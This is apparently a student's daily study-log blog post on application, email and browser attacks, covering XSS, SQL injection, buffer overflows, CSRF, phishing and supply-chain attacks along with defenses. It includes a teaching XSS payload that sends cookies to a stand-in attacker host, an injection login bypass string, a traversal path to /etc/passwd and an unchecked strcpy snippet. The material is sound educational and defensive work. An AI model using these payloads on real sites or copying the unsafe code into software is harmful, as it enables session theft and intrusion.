---
title: "Endpoint Security, Part 4: Application, Email and Browser Attacks"
date: 2026-11-01 21:00:00 +0500
categories: [Daily Log]
tags: [cybersecurity, application-security, xss, sql-injection, buffer-overflow, csrf, phishing, supply-chain]
---

The second half of today was about attacks on **applications**: websites, programs and APIs. Having built web apps and automations myself, this felt very close to home. Almost every attack here comes from one mistake: **an application trusting input it shouldn't trust**. If input isn't checked, an attacker can send *instructions* where the app expects *data*.

## Cross-site scripting (XSS)

In **XSS**, an attacker gets JavaScript into a trusted website, and it runs in **other visitors' browsers**.

Example: a comment box shows comments exactly as typed. The attacker posts this:

```html
<script>
  fetch('https://attacker.example/steal?c=' + document.cookie);
</script>
```

Every visitor who opens the page runs it. `document.cookie` reads their **session cookie** (the data proving they're logged in) and `fetch` sends it to the attacker, who can now log in as them without a password.

There are three types: **stored** (saved on the site, like the comment above), **reflected** (inside a link the victim clicks) and **DOM-based** (the page's own JavaScript inserts the bad input).

*Defense:* **output encoding** (turn `<` into `&lt;` so it's shown, not run), input validation, a **Content Security Policy**, and **HttpOnly** cookies that JavaScript can't read.

## Code injection

The same idea, aimed at different systems:

**SQL injection.** A login form builds a database query from user input:

```sql
SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT2';
```

If the attacker types `' OR 1=1 --` as the username, the query becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '';
```

The `'` closes the text early, `OR 1=1` is always true, and `--` turns the rest (the password check) into a comment. The attacker is logged in, often as the first user, which is usually the admin.

The fix is **parameterized queries**, where input is sent separately from the command:

```python
# Wrong: input glued into the query
cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")

# Right: input always treated as data
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**XML injection:** inserting tags into XML data an app processes, for example closing a `<name>` tag early and adding `<role>admin</role>`.

**DLL injection:** forcing a running Windows program to load a malicious **DLL** (a shared code library), so the attacker's code runs hidden inside a trusted process.

**LDAP injection:** **LDAP** is used to look up users in directories like Active Directory. Special characters like `*` (wildcard) can change the lookup and bypass a login check.

## Buffer overflow

A **buffer** is a fixed-size piece of memory. A **buffer overflow** happens when a program writes more data than fits, and the extra spills into nearby memory.

Think of a form box that fits 10 letters. If someone writes 30, the extra letters spill into the next box and change it. In memory, a carefully crafted overflow can overwrite the **return address** (where the program goes next) and make it run the attacker's code.

```c
char username[16];
strcpy(username, user_input);  // copies without checking length
```

*Defense:* check input length, use memory-safe languages, keep software patched, and rely on OS protections like ASLR and DEP.

## Remote code execution (RCE) and Metasploit

In my notes I first wrote "remote code injection," then crossed it out. The correct term is **remote code execution**: the attacker can run their own code on a target **over the network**. It's often the worst-case result, because it can mean full control. It usually comes from another flaw, like a buffer overflow or injection. **Log4Shell** (2021) is a famous example.

**Metasploit** is a well-known penetration testing framework with ready-made exploits and payloads, including **Meterpreter**, which gives remote control of a compromised machine. Defenders use it to prove a vulnerability is real; attackers use it too. Using it without written permission is illegal.

## Other application attacks

- **CSRF (cross-site request forgery):** a malicious page makes your browser send a request to a site you're logged into, like a bank transfer. The browser adds your cookie automatically. XSS abuses the user's trust in a site; CSRF abuses the site's trust in the user's browser. *Defense: anti-CSRF tokens, SameSite cookies.*
- **Race condition:** the attacker acts in the tiny gap between a **check** and a **use**, for example sending many withdrawal requests at once so they all pass the balance check. *Defense: locking.*
- **Improper input handling:** not checking type, length and format. This is the root of most attacks in this post. Always validate on the server, using allow-lists.
- **Error handling attacks:** detailed errors like `MySQL 5.7 error in /var/www/shop/db.php` hand the attacker clues. Show users a generic message and keep details in the logs.
- **API attacks:** weak authentication, or changing `/api/orders/1001` to `/api/orders/1002` and seeing someone else's order.
- **Replay attack:** capturing a valid message (like a login or a car key fob signal) and sending it again later. *Defense: timestamps and **nonces** (numbers used only once).*
- **Directory traversal:** using `../` to climb out of the web folder, like `?file=../../../../etc/passwd`.
- **Resource exhaustion:** using up memory, CPU or disk so the service stops working (a type of DoS).

## Defending against application attacks

| Defense | What it stops |
|---|---|
| Input validation (allow-lists, on the server) | Injection, XSS, traversal, overflows |
| Parameterized queries | SQL injection |
| Output encoding + CSP | XSS |
| Anti-CSRF tokens | CSRF |
| Generic error messages | Information leaks |
| Rate limiting | Resource exhaustion, API abuse |
| Least privilege, patching, code review | Limits damage / finds flaws early |
| Web Application Firewall (WAF) | Many common web attack patterns |

The **OWASP Top 10** is the standard list of the biggest web application risks.

## Email and browser attacks

| Attack | Channel | Key point |
|---|---|---|
| **Spam** | Email | Bulk unwanted mail, often carrying phishing or malware |
| **Phishing** | Email | Pretends to be a trusted source |
| **Spear phishing** | Email | Targeted at one person or team |
| **Whaling** | Email | Targeted at senior executives |
| **Vishing** | Phone | Voice phishing, sometimes with faked caller ID or AI voices |
| **Pharming** | DNS / hosts file | Sends you to a fake site **even when you type the correct address** |

Phishing needs you to click a bad link. Pharming doesn't.

*Email defenses:* spam filters, attachment sandboxing, and three email authentication standards:
- **SPF:** which servers may send email for a domain
- **DKIM:** a signature proving the email wasn't changed
- **DMARC:** what to do when SPF or DKIM fails

*Browser defenses:* keep browsers updated, block pop-ups, remove unneeded extensions, and use web and DNS filtering.

## Other attacks

- **Physical attacks:** charging cables with hidden chips that type commands, USB drives left in parking lots, and card skimmers on ATMs.
- **Adversarial AI attacks:** attacking machine learning systems, for example **data poisoning** (corrupting the training data so the model learns the wrong thing) or inputs crafted to fool a model.
- **Supply chain attacks:** compromising a trusted vendor or software update so every customer gets infected. In **SolarWinds** (2020), a backdoor hidden in signed updates reached about 18,000 customers.
- **Cloud-based attacks:** public storage buckets, stolen cloud keys (often pushed to GitHub by mistake, which is why I use **Gitleaks**), and hijacked admin accounts.

## Threat domains: the big picture

Looking back at the last few posts, the course groups everything into four **threat domains**:

1. **Deception:** social engineering and tricks
2. **Cyber attacks:** logic bombs, DNS, Layer 2, MitM, zero-days
3. **Wireless and mobile attacks**
4. **Application and other attacks:** today's post

Real attacks often chain them together. For example, a phishing email leads to malware that exploits an unpatched app.

## Why this matters for a SOC engineer

- **Web and WAF logs** often show `' OR 1=1`, `UNION SELECT`, `<script>` or `../`, which are clear signs of attack attempts.
- **Phishing triage** starts with checking SPF, DKIM and DMARC results in the email headers.
- **Supply chain attacks** arrive through trusted updates, so detection has to watch behavior, like a monitoring tool suddenly talking to an unknown server.
- As a developer, I now look at every input field as a possible door.

## Questions I should be able to answer

- How does `' OR 1=1 --` bypass a login, and how do parameterized queries stop it?
- XSS vs CSRF: what's the difference?
- What is a buffer overflow, and how can it lead to RCE?
- Phishing vs pharming?
- What do SPF, DKIM and DMARC each do?
- What happened in the SolarWinds attack?

## Next

Tomorrow: securing networks, who the attackers are, and a field-by-field look at the IPv4 and IPv6 packet headers.
